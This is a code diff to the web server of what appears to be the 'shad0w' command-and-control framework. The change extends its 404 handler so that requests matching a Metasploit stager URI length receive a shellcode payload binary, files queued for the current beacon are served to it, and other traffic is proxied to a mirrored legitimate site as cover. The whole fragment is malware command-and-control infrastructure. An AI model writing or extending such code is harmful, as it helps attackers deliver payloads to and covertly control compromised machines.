@@ -2,7 +2,7 @@ import sys
 import logging
 import mimetypes
 
-from lib import mirror
+from lib import mirror, buildtools
 from .path_handler import Handler
 
 from OpenSSL import SSL
@@ -35,7 +35,7 @@ def web_blank_page():
 
     if shad0w.mirror is None:
         return phandle.blank_page()
-    
+
     elif shad0w.mirror is not None:
         return shad0w.page_data
 
@@ -60,11 +60,31 @@ def web_stage_beacon():
 
     return phandle.stage_beacon(request)
 
-@app.errorhandler(404) 
+@app.errorhandler(404)
 def not_found(e):
+
+    req_path_len = len(request.path)
+
+    # check if it is a msf stager
+    try:
+        if req_path_len == int(shad0w.variables["MsfUriSize"]):
+            shad0w.debug.log(f"MSF callback...", log=True, new=True)
+            return shad0w.payloads["x64_secure_static_srdi"]["bin"]
+    except ValueError:
+        shad0w.debug.error(f"Value Error: {shad0w.variables['MsfUriSize']}")
+
+    try:
+        for obj in shad0w.beacons[shad0w.current_beacon]["serve"]:
+            if obj == request.path:
+                return shad0w.beacons[shad0w.current_beacon]["serve"][obj]
+    except: pass
+
+    if shad0w.mirror is None:
+        return ""
+
     path = shad0w.mirror + request.path
     shad0w.debug.log(f"proxying call to {path}")
-    
+
     data, headers, status_code = mirror.mirror_site(shad0w, path, dynamic=True, method=request.method, headers=request.headers,
                                                     data=request.get_data(), cookies=request.cookies)
 
